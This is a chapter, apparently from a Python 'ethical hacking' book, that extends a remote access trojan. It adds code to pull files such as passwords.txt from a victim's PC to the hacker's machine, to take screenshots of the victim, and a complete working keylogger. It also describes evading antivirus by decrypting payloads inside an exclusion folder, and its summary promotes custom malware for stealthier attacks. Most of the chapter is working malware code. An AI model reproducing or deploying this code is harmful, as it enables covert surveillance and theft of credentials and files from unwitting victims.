<html><head></head><body>
		<div id="_idContainer120">
			<h1 id="_idParaDest-146"><em class="italic"><a id="_idTextAnchor152"/>Chapter 7</em>: Advanced Malware</h1>
			<p>In the previous chapter, we learned how to create a very simple malware that executes <em class="italic">Windows</em> commands sent by a hacker and returns the results of these commands. This program is very limited in terms of its ability to just execute commands. Ideally, for a <strong class="bold">Remote Access Tool</strong>, we would want to have much more advanced functionalities than this. This chapter will give you a basic idea of what more advanced functionalities you can write inside your malware program. We will cover the following topics in this chapter:</p>
			<ul>
				<li>File transfer</li>
				<li>Stealing Wi-Fi credentials</li>
				<li>Taking screenshots</li>
			</ul>
			<h1 id="_idParaDest-147"><a id="_idTextAnchor153"/>Building a keylogger file transfer</h1>
			<p>We have already learned how to send and receive very basic data in the program we developed in <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>. In this chapter, we will try to send and receive files from <a id="_idIndexMarker399"/>one PC to another, first from the victim's PC to the hacker's PC, and then from the hacker's to the victim's PC. This will give us access to any sensitive files present on the victim's PC. For example, let's say that the victim has stored their passwords in a file present on their PC (which is a very bad idea; never store your passwords in a plain text file on your PC); then we can simply read the contents of the file and send it to the hacker. Let's see how this works.</p>
			<h2 id="_idParaDest-148"><a id="_idTextAnchor154"/>Downloading the victim file to the hacker</h2>
			<p>Here, we will modify the <a id="_idIndexMarker400"/>program we developed in <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>, where we ran Windows commands to add functionality for file transfer (see the <em class="italic">Creating malware</em> section). First, we will add a download functionality to send any file from the victim's PC to the hacker's PC and later in the other direction. To send files over the network, we need to perform certain steps. These are listed next:</p>
			<ol>
				<li>Check whether the file exists. If it does not, throw an error.</li>
				<li>If the file exists, read the contents of the file into your program.</li>
				<li>Once the contents are read, add a special marker to the end of the data to signify file transfer completion.</li>
				<li>Send the data bytes over the network.</li>
				<li>On the receiving side, receive the bytes until you match the marker.</li>
				<li>Once the marker is identified, remove the marker from the received bytes.</li>
				<li>Write the rest of the bytes onto the filesystem of your PC.</li>
				<li>Close the connection.</li>
			</ol>
			<p>Don't worry if you don't understand <a id="_idIndexMarker401"/>these steps straight away. We will go through these steps one by one. You can add this functionality to the program we already developed in <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>. To make things simpler, use the hacker and victim programs we developed in the <em class="italic">Creating malware</em> section from <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>. Create a new project in the Kali and Windows PCs for a hacker and server, and this time call it <em class="italic">advanced_server</em> and <em class="italic">advanced_victim</em>. Copy the code from previous chapters into the respective projects so that you have the code base to build on. </p>
			<p>Let's start by first defining how we will send the file from the victim to the hacker. Let's say there is a file present on the victim's PC with the victim's passwords stored. This is used as an example. Theoretically, you can download any file from the victim's PC that you want to. </p>
			<p>Let's say the filename is <strong class="source-inline">passwords.txt</strong>. Let's take a look at the strategy in graphic form to understand how this will work in practice: </p>
			<div>
				<div id="_idContainer111" class="IMG---Figure">
					<img src="image/B14788_07_01.jpg" alt="Figure 7.1 – Sending a file to the hacker&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.1 – Sending a file to the hacker</p>
			<p>First, we need to send the <a id="_idIndexMarker402"/>victim's filename from the hacker to the victim. We have already seen how we can send text data over the network when we learned about sockets in <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>, so this process is fairly straightforward. On the hacker program, we will design the following strategy to send the filename that we need to download from the victim. Our command will look something like this, <strong class="source-inline">download passwords.txt</strong>, if we want to download a file named <strong class="source-inline">passwords.txt</strong>. So, on the hacker program, we will check whether the hacker command starts with <strong class="source-inline">download</strong> to create a case for this condition. Let's take a look at the following code. In our main loop, where we check for different conditions, we will insert the following check: </p>
			<p class="source-code">elif command.startswith("download"):</p>
			<p class="source-code">                hacker_socket.send(command.encode())</p>
			<p class="source-code">                exist = hacker_socket.recv(1024)</p>
			<p>The first line checks whether the hacker's command is to download the file from the victim. If it is, we will send the <a id="_idIndexMarker403"/>command to the victim and the victim will reply whether the file exists. Depending on the reply, further action may be taken. If the file exists, we will handle the case for downloading the file, otherwise we will simply exit the program safely. Now, let's stop on the hacker program for a moment and go to the victim program. On the victim side, we need to add a similar case for checking whether the command is <strong class="source-inline">download</strong>. If it is, we will retrieve the filename from the received message and check whether the file exists. Go to the victim program and write the following check in the main loop: </p>
			<p class="source-code">elif hacker_command.startswith("download"):</p>
			<p class="source-code">    file_to_download = hacker_command.strip("download ")</p>
			<p class="source-code">    if os.path.exists(file_to_download):</p>
			<p class="source-code">        exists = "yes"</p>
			<p class="source-code">        victim_socket.send(exists.encode())</p>
			<p class="source-code">    else:</p>
			<p class="source-code">        exists = "no"</p>
			<p class="source-code">        victim_socket.send(exists.encode())</p>
			<p class="source-code">        continue</p>
			<p>Here, we are receiving the command and checking the type of command. Once we receive the command, which has a download string inside it, we can strip the download part from the command to retrieve the actual filename we are interested in. On the third line in the previous code, we check whether the file exists. If it does, we send back <strong class="source-inline">yes</strong>, otherwise we send back <strong class="source-inline">no</strong>. Remember that in the hacker program, we are waiting to receive this reply in the <strong class="source-inline">exists</strong> variable. Note that we haven't sent any file data yet. We are just creating the outer loop to properly handle the sending and receiving of data. The read part of the file will be handled in the first <strong class="source-inline">if</strong> statement in the previous code. Now we will need to read the file.</p>
			<p>Let's take a look at the code that follows, which reads the file from the victim's machine and then sends the file back to the hacker:</p>
			<p class="source-code">with open(file_to_download, "rb") as file:</p>
			<p class="source-code">    chunk = file.read(CHUNK_SIZE)</p>
			<p class="source-code">    while len(chunk) &gt; 0:</p>
			<p class="source-code">        victim_socket.send(chunk)</p>
			<p class="source-code">        chunk = file.read(CHUNK_SIZE)</p>
			<p class="source-code">        # This will run till the end of file.</p>
			<p class="source-code"># once the file is complete, we need to send the marker.                            victim_socket.send(eof_identifier.encode())</p>
			<p class="source-code">print("File sent successfully")</p>
			<p>Let's break down the <a id="_idIndexMarker404"/>code we just saw. The file line is a command to open and read the file in binary format. Even though it is a text file, it is a good idea to read files in binary format if you want to transfer them over the network since the file type could be anything in practical cases. Then we read a chunk of bytes, and we define <strong class="source-inline">CHUNK_SIZE = 2048</strong> at the top of the file. After we have read the first chunk, we check whether the file has more bytes. If it has, we send them iteratively over the network by using<a id="_idTextAnchor155"/> the <strong class="source-inline">while</strong> loop until we read the end of the file. This loop will stop when there is no further chunk to read from the file. Once we have sent the complete file over the network to the hacker, we need to send the identifier marker for the hacker to know that they can stop reading further. To do that, we send <strong class="source-inline">eof_identifier</strong>, which has the following value, <strong class="source-inline">eof_identifier = "&lt;END_OF_FILE_IDENTIFIER&gt;"</strong>. The hacker will use this identifier to know that the incoming data is complete. </p>
			<p>Next, we need to receive this data in the hacker program. To do this, go to the hacker program and check the value received for the <strong class="source-inline">exists</strong> variable. If the reply from the victim is <strong class="source-inline">yes</strong>, this means that the file exists on the victim's machine and we can start downloading it. Note that we <a id="_idIndexMarker405"/>just developed the program to send data, and now here we will receive the same data. The received data will be in the form of bytes, and we will write these bytes onto our hacker's PC to generate the same file as on the victim's PC. Let's take a look at the following code: </p>
			<p class="source-code">if exist.decode() == "yes":</p>
			<p class="source-code">    print("file exists")</p>
			<p class="source-code">    # receive file here</p>
			<p class="source-code">    file_name = command.strip("download ")</p>
			<p class="source-code">     with open(file_name, "wb") as file:</p>
			<p class="source-code">         print("Downloading file")</p>
			<p class="source-code">         while True:</p>
			<p class="source-code">             chunk = hacker_socket.recv(CHUNK_SIZE)</p>
			<p class="source-code">             file.write(chunk)</p>
			<p class="source-code">             if chunk.endswith(eof_identifier.encode()):</p>
			<p class="source-code">                  chunk = chunk[:-len(eof_identifier)]</p>
			<p class="source-code">                  file.write(chunk)</p>
			<p class="source-code">                  break</p>
			<p class="source-code">             </p>
			<p class="source-code">      print("Successfully downloaded, ", file_name)</p>
			<p>If the file exists, we create a new file with the same name as <strong class="source-inline">file_name</strong>. Note that we create the file in <strong class="source-inline">wb</strong> or write binary mode, so that we can download any type of file. Once we create a file, we need to write the received file content that we receive from the victim. We define the <strong class="source-inline">CHUNK_SIZE</strong> variable equal to the same size as we defined in the victim while sending the data, and then we start receiving data continuously and write it to the disk until the end, which is identified by the marker. You need to define the exact same <strong class="source-inline">eof_identifier</strong> variable as you defined in the victim, otherwise the program will not work. Once we reach the identifier, we remove the identifier, write the remaining bytes to the disk, and exit the loop. Finally, we can print the statement indicating that we have <a id="_idIndexMarker406"/>received all the data. Now that our program is complete, using this program, we can download data from the victim to the hacker. </p>
			<p>The complete code for the hacker is given here:</p>
			<p><a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py&#13;">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py</a></p>
			<p>Similarly, the complete code for the victim for sending the file to the hacker is given here:</p>
			<p><a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py&#13;">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py</a></p>
			<p>Now, let's try running this program. First, run the hacker and then the victim program. </p>
			<p>Create a file in the victim's PC with the name <strong class="source-inline">passwords.txt</strong> and write some random passwords into it:</p>
			<div>
				<div id="_idContainer112" class="IMG---Figure">
					<img src="image/B14788_07_02.jpg" alt="Figure 7.2 – Passwords file on the victim's PC&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.2 – Passwords file on the victim's PC</p>
			<p>Next, write the following command in the hacker program: <strong class="source-inline">download passwords.txt</strong>.</p>
			<p>Now, once the program is run, you will see the exact same file on the hacker's PC:</p>
			<div>
				<div id="_idContainer113" class="IMG---Figure">
					<img src="image/B14788_07_03.jpg" alt="Figure 7.3 – Downloading a file from the victim&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.3 – Downloading a file from the victim</p>
			<p>You will see that a file with the name <strong class="source-inline">passwords.txt</strong> has been created on the Kali machine and if you <a id="_idIndexMarker407"/>open this file, it will have the same contents as the one located on the victim's PC:</p>
			<div>
				<div id="_idContainer114" class="IMG---Figure">
					<img src="image/B14788_07_04.jpg" alt="Figure 7.4 – passwords.txt file on the hacker's machine&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.4 – passwords.txt file on the hacker's machine</p>
			<p>If you open the file, you will see the contents of the file. You can try downloading other types of files as well, such as images, and this will also work. </p>
			<h2 id="_idParaDest-149"><a id="_idTextAnchor156"/>Uploading files to the victim</h2>
			<p>The process of <a id="_idIndexMarker408"/>uploading files to the victim is very similar, except that the data now will go in the opposite direction. Using this method, you can potentially upload other advanced malware to the victim's machine and run it. However, the malware can't be uploaded directly. The <strong class="bold">Intrusion Detection System</strong> (<strong class="bold">IDS</strong>) will <a id="_idIndexMarker409"/>detect it. If we try to upload it directly, some modifications will be required to upload other malware using this method. First, you need to encrypt the malware bytes and send the encrypted data over the network. Let's try to understand how the IDS works. Antiviruses have a huge database of malware file signatures. A signature, in the simplest terms, is a sequence of bytes from a malware program. So, if a signature of a file matches with the database of the antivirus program, the antivirus program will know that the file is malware. In order to beat it, we need to encrypt the data. Once the malware is encrypted, its sequence of bytes changes and the antivirus program will think that it is not malware. However, we still need to decrypt these files to make them run properly. Let's say we send encrypted malware over the network to the victim using the method we just developed. The encrypted file will be sent to the victim and when we try to decrypt it to retrieve the original file, the antivirus <a id="_idIndexMarker410"/>program will detect it immediately and block this file. This doesn't sound like very good news. However, we can beat this detection if we decrypt the file in a folder that is added to the antivirus exception folder. This antivirus program will not scan this folder and we can successfully decrypt the malware and run it. There is one small caveat here, however. To add a folder to antivirus exceptions, we require administrator privileges. We will see later in <a href="B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160"><em class="italic">Chapter 8</em></a>, <em class="italic">Post Exploitation</em>, how we can get administrator privileges. The code for uploading files to the hacker will be very similar, so it will be redundant to discuss it here again. I have already discussed how we can send it over the network. In the next section, we will learn how we can steal Wi-Fi passwords stored on the PC. </p>
			<h1 id="_idParaDest-150"><a id="_idTextAnchor157"/>Taking screenshots </h1>
			<p>You can also take screenshots of the victim's PC using your malware. For this, you will need to install additional libraries. We will need a module called <strong class="source-inline">pyautogui</strong>. This module will help you <a id="_idIndexMarker411"/>to take a screenshot on the victim's PC: </p>
			<ol>
				<li value="1">To install it, go to your victim's machine and write the following command to install it. It's a good idea to create a virtual environment and install this program in the virtual environment:<p class="source-code"><strong class="bold">pip install pyautogui</strong></p><p>This will install the requisite module. </p></li>
				<li>Next, we need to define the case for taking a screenshot. In the hacker program, create a new case and set the following condition:<p class="source-code">if command == "screenshot":</p><p class="source-code">     print("Taking screenshot")</p></li>
				<li>Similarly, on the victim program, write the same case as well: <p class="source-code">elif hacker_command == "screenshot":</p><p class="source-code">    print("Taking screenshot")</p><p class="source-code">    screenshot = pyautogui.screenshot()</p><p class="source-code">    screenshot.save("screenshot.png")</p><p class="source-code">    print("screenshot saved")</p><p>This will save the screenshot on the victim's PC as <strong class="source-inline">screenshot.pn</strong>. </p></li>
				<li>Let's run this <a id="_idIndexMarker412"/>program and see what the output looks like. On the hacker's machine, the output should look like this: <div id="_idContainer115" class="IMG---Figure"><img src="image/B14788_07_05.jpg" alt="Figure 7.5 – Hacker program taking a screenshot&#13;&#10;"/></div><p class="figure-caption">Figure 7.5 – Hacker program taking a screenshot</p><p>The victim program looks like this: </p><div id="_idContainer116" class="IMG---Figure"><img src="image/B14788_07_06.jpg" alt="Figure 7.6 – Victim program taking a screenshot&#13;&#10;"/></div><p class="figure-caption">Figure 7.6 – Victim program taking a screenshot</p></li>
				<li>If you go to the victim's PC, you will see that a file is saved on the disk named <strong class="source-inline">screenshot.png</strong>. You can retrieve this file to the hacker's PC using the method we learned earlier. Just write the following command in the hacker program:<p class="source-code"><strong class="bold">download screenshot.png</strong></p><p>This will move the screenshot to the hacker's PC. I took the following screenshot: </p></li>
			</ol>
			<div>
				<div id="_idContainer117" class="IMG---Figure">
					<img src="image/B14788_07_07.jpg" alt="Figure 7.7 – Screenshot taken on a Windows PC&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.7 – Screenshot taken on a Windows PC</p>
			<p>In this section, we have <a id="_idIndexMarker413"/>learned how we can take a screenshot of the victim's PC using our hacker program and how we can transfer the file over to the hacker's PC. In the next section, we will learn how to create a keylogger to keep track of the victim's keystrokes. </p>
			<h1 id="_idParaDest-151"><a id="_idTextAnchor158"/>Keylogger</h1>
			<p>In this section, we will build a <a id="_idIndexMarker414"/>simple keylogger. A keylogger is a malware program that records the keystrokes of the user. It is one of the most common kinds of malware programs. Keyloggers are often used to steal passwords and other sensitive information, such as credit cards. Keyloggers are often made to be as silent as possible, which means that it is very hard to detect keyloggers. Let's try building a simple keylogger. You will need to install a module called <strong class="source-inline">pynput</strong> to build a keylogger. This module allows you to access keystrokes programmatically: </p>
			<ol>
				<li value="1">To install this module, use the following command:<p class="source-code"><strong class="bold">pip install pynput</strong></p><p>This will install the module: </p></li>
				<li>Once the module is installed, we can import <strong class="source-inline">keyboard</strong> from this module: <p class="source-code"><strong class="bold">from pynput import keyboard</strong></p></li>
				<li>Next, we will define a listener for listening to keystrokes. This listener will handle different cases on different events. Take a look at the following code: <p class="source-code">with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:</p><p class="source-code">    listener.join()</p><p>The previous code <a id="_idIndexMarker415"/>defines two functions for the <em class="italic">press</em> and <em class="italic">release</em> of a keystroke. When a key is pressed, the <strong class="source-inline">onPress</strong> function will be called, and when a key is released, the <strong class="source-inline">onRelease</strong> function will be called. </p></li>
				<li>Now we will define these functions. Let's take a look at the functions:<p class="source-code">def onPress(key):</p><p class="source-code">    print(str(key))</p><p class="source-code">def onRelease(key):</p><p class="source-code">    if str(key) == 'Key.esc':</p><p class="source-code">        return False</p><p>We have defined very simple functions. When we press the key, we simply print it, and when the key is released, we check for which key was pressed. If the pressed key was the <em class="italic">Esc</em> key, we exit the program, otherwise we continue. This way, we have an exit condition and don't get stuck. If we don't define this condition, we can't exit the program, since pressing <em class="italic">Ctrl</em> + <em class="italic">C</em> would simply print it instead of exiting. To safely return from this function, we return the <strong class="source-inline">False</strong> value. Let's take a look at a simple execution: </p><div id="_idContainer118" class="IMG---Figure"><img src="image/B14788_07_08.jpg" alt="Figure 7.8 – Printing pressed keys&#13;&#10;"/></div><p class="figure-caption">Figure 7.8 – Printing pressed keys</p><p>In this screenshot, we print the keys we pressed during execution of the program. When we pressed the <em class="italic">Esc</em> key, it exited the program. This is all there is to a very basic keylogger. However, in practical cases, you will be running this program on the victim's machine, so just printing on the console is not very helpful. Ideally, we <a id="_idIndexMarker416"/>would want to keep a log of these keystrokes. A lot of keyloggers store the keystrokes in a file, which hackers can retrieve and see whether any password or other sensitive information was typed. </p></li>
				<li>Now we will make changes to our keylogger to make it more useful. Let's create a new filename, <strong class="source-inline">keylogs.txt</strong>.<strong class="source-inline"> </strong><p>We will store our logs in this file. Let's take a look at the code:</p><p class="source-code">import sys</p><p class="source-code">filename = "keylogs.txt"</p><p class="source-code">file = open(filename, "w")</p><p class="source-code">def onPress(key):</p><p class="source-code">    print(str(key))</p><p class="source-code">    file.write(str(key))</p><p class="source-code">def onRelease(key):</p><p class="source-code">    if str(key) == 'Key.esc':</p><p class="source-code">        file.close()</p><p class="source-code">        sys.exit(0)</p><p>Here we create a file in write mode and every time a key is pressed, we store the key in the file. Finally, when the <em class="italic">Esc</em> key is pressed, we close the file and exit. If you start the program and run it and press some keys, you will see that a new file is created, and all the key logs are stored inside the file. Here is the result of me executing this operation: </p><div id="_idContainer119" class="IMG---Figure"><img src="image/B14788_07_09.jpg" alt="Figure 7.9 – Stored keystrokes in a file&#13;&#10;"/></div><p class="figure-caption">Figure 7.9 – Stored keystrokes in a file</p></li>
				<li>You can see in the <a id="_idIndexMarker417"/>preceding screenshot that each character has quotation marks around it. We can remove these quotation marks for better visibility. In order to replace it, we can update the following code: <p class="source-code">def onPress(key):</p><p class="source-code">    print(str(key))</p><p class="source-code">    stroke = str(key).replace("'", "")</p><p class="source-code">    if str(key) == "Key.esc":</p><p class="source-code">        file.write(" ")</p><p class="source-code">    else:</p><p class="source-code">  file.write(stroke)</p><p>Here, we made two changes. First, we replaced single quotes with empty strings before writing them into the file and secondly, if the key is <em class="italic">Esc</em>, we don't write it onto the file. Now, if you run the program, you will see that it only registers characters.</p><p>If you press any special key, such as <em class="italic">Enter</em> or <em class="italic">space</em>, you will see that the program registers <a id="_idIndexMarker418"/>their name instead of their functionality, which is not what we want. We would like to see a space when a user presses the space button. To achieve this, we will add the following changes: </p><p class="source-code">def onPress(key):</p><p class="source-code">    print(str(key))</p><p class="source-code">    stroke = str(key).replace("'", "")</p><p class="source-code">    if str(key) == "Key.space":</p><p class="source-code">        file.write(" ")</p><p class="source-code">    elif str(key) == "Key.enter":</p><p class="source-code">        file.write("\n")</p><p class="source-code">    elif str(key) == "Key.esc":</p><p class="source-code">        file.write(" ")</p><p class="source-code">    else:</p><p class="source-code">        file.write(stroke)</p></li>
				<li>Our keylogger is almost complete. We just need to add one final modification. Our keylogger doesn't support backspace. To add this functionality, take a look at the following code: <p class="source-code">import os</p><p class="source-code">    elif str(key) == "Key.backspace":</p><p class="source-code">        file.seek(file.tell()-1, os.SEEK_SET)</p><p class="source-code">        file.write("")</p><p>This code checks for a backspace, and if we encounter one, we move back one character and put an <a id="_idIndexMarker419"/>empty string there. This replaces the existing character stored on the file. Now, our basic keylogger is complete. It supports character insertion, along with the ability to register backspaces as well. The complete program for the keylogger is written here: </p><p class="source-code">from pynput import keyboard</p><p class="source-code">import sys</p><p class="source-code">import os</p><p class="source-code">filename = "keylogs.txt"</p><p class="source-code">file = open(filename, "w")</p><p class="source-code">def onPress(key):</p><p class="source-code">    print(str(key))</p><p class="source-code">    stroke = str(key).replace("'", "")</p><p class="source-code">    if str(key) == "Key.space":</p><p class="source-code">        file.write(" ")</p><p class="source-code">    elif str(key) == "Key.enter":</p><p class="source-code">        file.write("\n")</p><p class="source-code">    elif str(key) == "Key.esc":</p><p class="source-code">        file.write(" ")</p><p class="source-code">    elif str(key) == "Key.backspace":</p><p class="source-code">        file.seek(file.tell()-1, os.SEEK_SET)</p><p class="source-code">        file.write("")</p><p class="source-code">    else:</p><p class="source-code">        file.write(stroke)</p><p class="source-code">def onRelease(key):</p><p class="source-code">    if str(key) == 'Key.esc':</p><p class="source-code">        file.close()</p><p class="source-code">        sys.exit(0) </p><p class="source-code">if __name__ == "__main__":</p><p class="source-code">    with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:</p><p class="source-code">        listener.join()</p></li>
			</ol>
			<p>In this section, we have <a id="_idIndexMarker420"/>learned how we can deploy a simple keylogger. Using this as a base, you can write a far more advanced keylogger. </p>
			<h1 id="_idParaDest-152"><a id="_idTextAnchor159"/>Summary</h1>
			<p>In this chapter, we have learned how we can add advanced functionalities to our basic malware. First, we added support for file transfer from the victim to the client, and then we added additional features, such as taking a screenshot from the victim's machine and sending it back to the hacker. Finally, we built our own keylogger. Every day, thousands of pieces of malware are written and antivirus programs try to keep up with them for detection. The advantage of writing your own malware is that it will not be easy and detect them programs to detect this malware since it is written by you and does not yet exist in antivirus databases. This gives you the opportunity for a more successful attack. Using the tools we developed in this chapter will give you an understanding of how you can build more advanced malware and how you can add more features to it as you wish. The skills gained by writing your custom malware will give you opportunities for more stealth attacks and less detection by antivirus programs. </p>
			<p>In the next chapter, we will see how we can package our code into a single executable and how we can use it for hacking purposes. See you in the next chapter! </p>
		</div>
	</body></html>